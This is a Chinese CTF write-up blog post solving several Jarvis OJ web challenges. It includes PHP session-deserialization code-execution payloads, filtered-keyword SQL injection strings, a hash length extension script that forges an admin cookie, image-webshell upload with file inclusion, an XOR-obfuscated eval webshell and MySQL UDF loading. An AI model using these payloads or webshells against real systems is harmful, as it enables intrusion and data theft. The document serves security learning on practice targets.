<p> <strong>php</strong> 在获取 <strong>session</strong> 的时候，会按照 <strong>session.serialize_handler=php</strong> 规则来处理 <strong>session</strong> 文件，<strong>将 | 符号之前的所有内容认为是键名，之后的内容则用于反序列化。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>为了防止转义,需要在引号前加反斜杠\ </p>
<p>然后在payload前加一个| </p>
<p>这是session的格式</p>
<p><img src="https://i.loli.net/2020/01/03/7JqWUGynZTCp1gL.png"></p>
<p>接下来就是读取这个文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Here_1s_7he_fl4g_buT_You_Cannot_see.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;</span><br></pre></td></tr></table></figure>

<p>在phpinfo中找到文件存放的路径</p>
<p><img src="https://i.loli.net/2020/01/03/ABLgnjhaouYZmCQ.png"></p>
<p><img src="https://i.loli.net/2020/01/03/4fTs8PQ9ijlZ5VJ.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;&#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/01/03/Eb9PIlhTSjnFQM1.png"></p>
<p>总结:</p>
<ul>
<li>对于session反序列化的原理要理解.</li>
<li>以及防止转义的原理.</li>
<li>构造文件上传的那个HTML写法</li>
</ul>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB?"></a>WEB?</h1><ul>
<li>代码还原</li>
<li>解方程 <a target="_blank" rel="noopener" href="http://www.yunsuan.info/matrixcomputations/solvematrixmultiplication.html?referer=www.yunsuanzi.com">运算网</a></li>
</ul>
<p>打开题目.在Google中只能找到app.js是作者写的</p>
<p>打开后用sublime test 还原 </p>
<p>因为这个页面没有form表单,所以这个app.js中必有实现POST请求的代码,找到代码所在的位置,继续跟进解密</p>
<p>总结: </p>
<p>关于这类题,我的解题能力还是比较弱的-.-</p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE?"></a>RE?</h1><p>参考文章: </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/albertsh/article/details/78567661">mysql函数扩展之UDF开发</a></p>
<p><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/adding-udf.html">Adding a User-Defined Function</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sijidou/p/10522972.html">UDF提权</a></p>
<p>查看mysql插件的目录</p>
<p>/usr/lib/x86_64-linux-gnu/mariadb19/plugin/</p>
<p><img src="https://i.loli.net/2020/01/03/lm72XZ4x9OdVWw6.png"></p>
<p>然后将题目所给的附件下载到这个目录里面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;mariadb19&#x2F;plugin# wget https:&#x2F;&#x2F;dn.jarvisoj.com&#x2F;challengefiles&#x2F;udf.so.02f8981200697e5eeb661e64797fc172</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/01/03/b2j6tGysTOp3hmM.png"></p>
<p>登录mysql后,加载getflag函数即可得到flag.但是必须先加载help_me函数</p>
<p>create function getflag returns string soname ‘udf.so.02f8981200697e5eeb661e64797fc172’;</p>
<p><img src="https://i.loli.net/2020/01/03/mO5GQFz9Io3kbqx.png"></p>
<p>总结:</p>
<blockquote>
<p>UDF就是Userdefined function,是用户自定义函数,</p>
<p>UDF就是为了让我们user能够写方便自己的函数,有3种返回值,这三种分别是STRING,INTEGER,REAL</p>
<p>定义格式:</p>
<p>create function function_name returns (strings|integer|real) soname ‘文件名’;</p>
<p>删除自定义函数: </p>
<p>drop function function_name;</p>
</blockquote>
<h1 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h1><ul>
<li>eregi()函数存在截断漏洞</li>
<li>file_get_contents($a,’r’);可以利用PHP伪协议php://input读取文件流(数据流)</li>
<li>过滤了空格和部分关键字的SQL注入</li>
</ul>
<p>右键查看源代码,发现index.phps.打开后得到一部分源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!--index.phps--&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">&#x27;Location: index.php?id=1&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$a=$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b=$_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;Hahahahahaha&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">&quot;1112 is a nice lab!&quot;</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">&quot;111&quot;</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">&quot;flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">&quot;work harder!harder!harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<p>?id=c&amp;a=php://input&amp;b=%0011111</p>
<p>POST的内容如下: </p>
<p>1112 is a nice lab!</p>
<p>得到</p>
<p>/^HT2mCpcvOLf</p>
<p>访问这个目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32780&#x2F;%5EHT2mCpcvOLf&#x2F;index.php?id&#x3D;4%27%20union%20select%201,2,3#</span><br></pre></td></tr></table></figure>

<p>返回 you bad boy/girl! 这里应该是过滤一些字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?id&#x3D;4&#39;&lt;&gt;union&lt;&gt;select&lt;&gt;1,2,3#</span><br></pre></td></tr></table></figure>

<p>尝试绕过空格,返回</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM content WHERE id&#x3D;4&#39;&lt;&gt;&lt;&gt;&lt;&gt;1,2,3</span><br></pre></td></tr></table></figure>

<p>可以看到,union和select都被过滤了.尝试双写绕过</p>
<p>双写绕过确实可行,但是&lt;&gt;绕过空格检测在这道题上不能正确执行sql语句,要想执行正确的sql语句必须使用/**/</p>
<p>用注释取代空格</p>
<p>判断列数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32780&#x2F;%5EHT2mCpcvOLf&#x2F;index.php?id&#x3D;-1&#x2F;*123*&#x2F;ununionion&#x2F;*123*&#x2F;seleselectct&#x2F;*123*&#x2F;1,2,3#</span><br></pre></td></tr></table></figure>

<p>返回结果为3,那么那么那么说明在3这个位置存在注入</p>
<p>把3改为database(),得到数据库名为test</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#x2F;*123*&#x2F;ununionion&#x2F;*123*&#x2F;seleselectct&#x2F;*123*&#x2F;1,2,group_concat(table_name)&#x2F;*1*&#x2F;frofromm&#x2F;*1*&#x2F;information_schema.tables&#x2F;*1*&#x2F;where&#x2F;*1*&#x2F;table_schema&#x3D;0x74657374# 这里也可以直接写database(). 不采用16进制绕过</span><br></pre></td></tr></table></figure>

<p>继续查表为content,稍微改一点东西</p>
<p>查表中字段为id,context,title</p>
<p>查具体的flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1&#x2F;*123*&#x2F;ununionion&#x2F;*123*&#x2F;seleselectct&#x2F;*123*&#x2F;1,2,(seleselectct&#x2F;*123*&#x2F;context&#x2F;*123*&#x2F;frofromm&#x2F;*13*&#x2F;content)#</span><br></pre></td></tr></table></figure>

<p>PCTF{Fin4lly_U_got_i7_C0ngRatulation5}</p>
<p>总结:</p>
<p>很好的一道题,当时做到一半以为已经拿到flag的~</p>
<p>这道题的前半部分是以前做过的,所以很容易.就是没有想到把得到那个{}中的内容当做URL.这个鬼脑洞.</p>
<p>以及过滤了哪些关键字的测试,如何绕过.都是以后需要深度学习的.(以后===寒假)</p>
<h1 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h1><ul>
<li>抓包分析,大概就是把guest改为admin,但是无源码就找不到入口</li>
<li>目录爆破</li>
<li>Vim 临时文件恢复</li>
<li><strong>Hash扩展攻击</strong></li>
</ul>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zpy1998zpy/article/details/80858080">参考文章</a></p>
<p><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/web/69264.html">http://www.freebuf.com/articles/web/69264.html</a></p>
<p><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/web/31756.html">http://www.freebuf.com/articles/web/31756.html</a></p>
<p><img src="https://i.loli.net/2020/01/03/rkIwaty1HMVFbxA.png"></p>
<blockquote>
<p>扫到index.php~这个文件 这个文件其实是php的备份文件.</p>
<p>php的备份文件又两种:</p>
<p>php~ 和 php.bak</p>
<p>备份文件常见的格式: </p>
<p>.bak .save .swp ~</p>
</blockquote>
<p>将其改为flag.php.swp</p>
<p><img src="https://i.loli.net/2020/01/03/eXOtadkCbAoH7yP.png"></p>
<p>来分析一波代码,这里如果auth为true那么就输出flag</p>
<p>为true的条件是什么呢? </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$role===<span class="string">&quot;admin&quot;</span>&amp;&amp;hsh===md5($salt.strrev($_COOKIE[<span class="string">&quot;role&quot;</span>]))</span><br></pre></td></tr></table></figure>

<p>strrev()函数的作用是反转字符串</p>
<p>也就是$salt加上反转后的cookie然后进行md5值满足这个hsh但是我们并不知道salt是多少</p>
<p>hash的原理</p>
<p>进行两次复杂的数学运算,将第一次运算的结果作为register的值再进行第二次运算</p>
<p>然后这里我们不知道salt,但是我们知道md5($salt.反转后的cookie)的值</p>
<p>salt的长度也不知道.需要爆破出salt的长度</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://web.jarvisoj.com:32778/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">28</span>):</span><br><span class="line">    result = hashpumpy.hashpump(<span class="string">&#x27;3a4727d57463f122833d9e732f94e4e0&#x27;</span>,<span class="string">&#x27;;&quot;tseug&quot;:5:s&#x27;</span>,<span class="string">&#x27;;&quot;nimda&quot;:5:s&#x27;</span>,i)</span><br><span class="line">    data = &#123;<span class="string">&quot;Host&quot;</span>: <span class="string">&quot;web.jarvisoj.com:32778&quot;</span>,<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>,<span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&quot;</span>,<span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span>,<span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;UM_distinctid=1656bc8a44b150-0acd2220410fbd-323b5b03-144000-1656bc8a44c1ff; role=%s; hsh=%s&quot;</span>%(urllib.quote(result[<span class="number">1</span>] <span class="comment">#这段内容可用bp抓包[::-1]),result[0]),&quot;Connection&quot;:&quot;close&quot;&#125;   #[::-1]取反,这里与strrev对应.%s表示格式化一个对象为字符串</span></span><br><span class="line">    re = requests.get(url, headers = data)</span><br><span class="line">    <span class="keyword">if</span>(re.text.find(<span class="string">&quot;Only Admin can see the flag!!&quot;</span>) == <span class="number">-1</span>):</span><br><span class="line">        print(re.text)</span><br></pre></td></tr></table></figure>

<p>因为要逐个爆破,所以脚本运行的时候要等一下才会出flag</p>
<p>PCTF{H45h_ext3ndeR_i5_easy_to_us3}</p>
<p>总结: </p>
<p>理解hash加密算法原理, MD5 SHA1. 理解hash 扩展攻击的原理,以及进行攻击的必要条件(知道hash1,密钥长度)</p>
<p>可利用场景</p>
<h1 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h1><ul>
<li>文件包含</li>
<li>文件上传</li>
</ul>
<p>上传一个png图片</p>
<p><img src="https://i.loli.net/2020/01/03/52JRSTutnwh9ksQ.png"></p>
<p>尝试传一个.htaccess 也提示只能穿JPG和GIF</p>
<p>从题目描述中也可以猜到可能会使用两个或多个漏洞来结合</p>
<p>随便改一个参数index.php?page=sqw</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">**Warning**:  fopen(21.php): failed to open stream: No such file or directory in **&#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;index.php** on line **24**</span><br><span class="line"> No such file!</span><br></pre></td></tr></table></figure>

<p>说明这里存在文件包含,制作一个图片马.<strong>推荐使用JS方式的图片马.,因为大部分会对PHP格式的进行验证.</strong></p>
<p>上传后,得到链接为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32785&#x2F;uploads&#x2F;1577946975.jpg</span><br></pre></td></tr></table></figure>

<p>然后再去包含这个文件index.php?page=uploads/1577946975.jpg%00</p>
<p>得到flag</p>
<p>总结: </p>
<p>除了文件上传漏洞常用的绕过方式需要知道外,还需要知道文件上传能和那些漏洞结合,比如文件包含.</p>
<h1 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h1><ul>
<li>SSRF    <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2115">https://xz.aliyun.com/t/2115</a></li>
</ul>
<p>点进去一个菜刀-.-管理员登录,查看源码给了IP地址 admin ip is 202.5.19.128</p>
<p>从图片的加载链接,来看,是存在类似使用代理跳转的这种东西,这个名字也是我自己瞎编的</p>
<p><a target="_blank" rel="noopener" href="http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/">http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YOU&#39;RE CLOOSING!</span><br></pre></td></tr></table></figure>

<p>扫描目录,有robots.txt(记住这个东西,在CTF题里面太重要了,下次可以不用扫,没进一个新的URL都先看看有没有robots.txt)</p>
<p>访问trojan.php.txt</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $&#123;(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>).(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>)&#125;=(<span class="string">&quot;!&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;( &quot;</span>^<span class="string">&quot;&#123;&quot;</span>).(<span class="string">&quot;(&quot;</span>^<span class="string">&quot;[&quot;</span>).(<span class="string">&quot;~&quot;</span>^<span class="string">&quot;;&quot;</span>).(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;.&quot;</span>).(<span class="string">&quot;*&quot;</span>^<span class="string">&quot;~&quot;</span>);$&#123;(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>).(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>)&#125;((<span class="string">&quot;-&quot;</span>^<span class="string">&quot;H&quot;</span>). (<span class="string">&quot;]&quot;</span>^<span class="string">&quot;+&quot;</span>). (<span class="string">&quot;[&quot;</span>^<span class="string">&quot;:&quot;</span>). (<span class="string">&quot;,&quot;</span>^<span class="string">&quot;@&quot;</span>). (<span class="string">&quot;&#125;&quot;</span>^<span class="string">&quot;U&quot;</span>). (<span class="string">&quot;e&quot;</span>^<span class="string">&quot;A&quot;</span>). (<span class="string">&quot;(&quot;</span>^<span class="string">&quot;w&quot;</span>).(<span class="string">&quot;j&quot;</span>^<span class="string">&quot;:&quot;</span>). (<span class="string">&quot;i&quot;</span>^<span class="string">&quot;&amp;&quot;</span>). (<span class="string">&quot;#&quot;</span>^<span class="string">&quot;p&quot;</span>). (<span class="string">&quot;&gt;&quot;</span>^<span class="string">&quot;j&quot;</span>). (<span class="string">&quot;!&quot;</span>^<span class="string">&quot;z&quot;</span>). (<span class="string">&quot;T&quot;</span>^<span class="string">&quot;g&quot;</span>). (<span class="string">&quot;e&quot;</span>^<span class="string">&quot;S&quot;</span>). (<span class="string">&quot;_&quot;</span>^<span class="string">&quot;o&quot;</span>). (<span class="string">&quot;?&quot;</span>^<span class="string">&quot;b&quot;</span>). (<span class="string">&quot;]&quot;</span>^<span class="string">&quot;t&quot;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p> <strong>Warning</strong>:  assert() [<a target="_blank" rel="noopener" href="http://localhost/CTF/function.assert">function.assert</a>]: Assertion “eval($_POST[360])” failed in <strong>D:\phpStudy\PHPTutorial\WWW\CTF\rf.php</strong> on line <strong>1</strong></p>
</blockquote>
<p>在本地运行后,报错,360应该就是这个密码</p>
<p>然后使用hackbar,POST 一个360过去 就看到了flag 或者 360=system(‘ls’);</p>
<p>总结:SSRF特征,利用方式,常见bypass后期为专门出的.</p>
<blockquote>
<p>1.社交分享功能：获取超链接的标题等内容进行显示</p>
<p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>
<p>3.在线翻译：给网址翻译对应网页的内容</p>
<p>4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p>
<p>5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p>
<p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p>
<p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p>
<p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p>
<p>9.邮件系统：比如接收邮件服务器地址</p>
<p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p>
<p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p>
<p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p>
<p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p>
</blockquote>
<h1 id="图片上传漏洞"><a href="#图片上传漏洞" class="headerlink" title="图片上传漏洞"></a>图片上传漏洞</h1><ul>
<li><a target="_blank" rel="noopener" href="https://www.2cto.com/article/201605/505823.html">CVE-2016-3714 好牛B的一个洞</a></li>
</ul>
<blockquote>
<p>漏洞原理</p>
<p>ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用<a target="_blank" rel="noopener" href="https://www.2cto.com/os/">系统</a>的system命令来执行的</p>
<p>它定义了很多占位符，比如%i是输入的文件名，%l是图片exif  label信息。而在后面command的位置，%i和%l等占位符被拼接在命令行中。这个漏洞也因此而来，被拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号（`）或闭合双引号，来执行任意命令。</p>
</blockquote>
<p>只能上传图片.扫描目录存在test.php|login.php|config.php|register.php打开其中的test.php是一个phpinfo界面</p>
<p>在学了一波CVE分析文章后,还是做不出来这道题,然后看了一大波WP</p>
<p><a target="_blank" rel="noopener" href="https://err0rzz.github.io/2017/09/11/jarvisoj/">其中这个大佬的WP比较详细</a>,然后他还写了一个常驻内存的脚本,循环删除上传的文件..</p>
<p><a target="_blank" rel="noopener" href="https://nonuplebroken.com/2019/05/11/JarvisOJ-WEB-WP/">另一个大佬</a></p>
<p>但是我上传一个正常的png,并没有被删除,能正常访问</p>
<p><strong>进行两次转义,一次是本地的exiftool命令，一次是漏洞触发时的echo命令</strong></p>
<p><img src="https://i.loli.net/2020/01/03/POlckomCfK4aW3s.png"></p>
<p>然后上传test.png</p>
<p>然后修改filetype=show或者win,在重新发包,ImageMagick在收到这张图片时就会转换这张的图片的格式,但是无论改什么,返回都是png文件</p>
<p>所以我蚁剑就连不上,拿不到flag!</p>
<p>嫖的flag</p>
<p>CTF(873dfee87823248f4a1657650204697a}</p>
<p>总结: </p>
<ul>
<li>exiftool工具我也是通过这道题第一次使用,应该以后也会用到!</li>
<li>转义,为什么转义  参考 <a target="_blank" rel="noopener" href="https://www.freebuf.com/column/145182.html">https://www.freebuf.com/column/145182.html</a></li>
</ul>
<blockquote>
<p>因为代码用了双引号嵌套，双引号里的双引号需要进行转义不然语法错误</p>
</blockquote>
<ul>
<li>写后门的新姿势</li>
<li><strong>CVE漏洞在CTF中的应用复现</strong></li>
</ul>
<h1 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h1><ul>
<li>bool盲注,如果密码错误就是true,用户名错误就是false</li>
<li>Python盲注脚本</li>
<li>SQLmap高级用法</li>
</ul>
<p>用户名,密码随便输,提示用户名错误.输入admin,admin提示密码错误,说明采用的是用户名和密码分布验证的</p>
<p>即先验证用户名再验证密码</p>
<p>当用户名为 admin’#密码错误,说明’#没有被过滤 当输出 admin’ and 1=1#使,用户名错误,说明过滤了空格或者and</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当输入admin&#39;&#x2F;*1*&#x2F;and&#x2F;*1*&#x2F;1&#x3D;1#时,密码错误.说明过滤了空格</span><br></pre></td></tr></table></figure>

<p>因此使用在网上嫖到的盲注脚本跑就行了-.- SB石锤</p>
<p>当然也可以使用SQLmap这个强大的工具!</p>
<p>即 –tamper=space2comment模式可以解决这类问题</p>
<p><img src="https://i.loli.net/2020/01/03/wnxoZUKuvTCJFhq.png"></p>
<p><img src="https://i.loli.net/2020/01/03/bk6J3WRAv4q29Lr.png"></p>
<p>查密码为 </p>
<p>334cfb59c9d74849801d5acdcfdaadc3</p>
<p><a target="_blank" rel="noopener" href="https://www.somd5.com/">在这里解密</a> 为</p>
<p>eTAloCrEP</p>
<p>登录进去,得到flag</p>
<p>CTF{s1mpl3_1nJ3ction_very_easy!!}        </p>
<p>总结: </p>
<p>不得不说sqlmap 真的很强大,学会使用他可以方便很多,但是SQLi的原理也是必须掌握的.</p>
<p>编写sqli的python脚本,也是需要必须掌握的.寒假加油!</p>
<p>冲!菜狗准备开始深入学习漏洞了,并且保持每天两道攻防世界练习!奥利奥! …奥利给!</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">m0nk3y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hack-for.fun/6247.html">https://hack-for.fun/6247.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><div class="social-share pull-right" data-disabled="google,facebook"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/c73f.html"><i class="fa fa-chevron-left">  </i><span></span></a></div><div class="next-post pull-right"><a href="/2019.html"><span>About My 2019</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2021 By m0nk3y</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>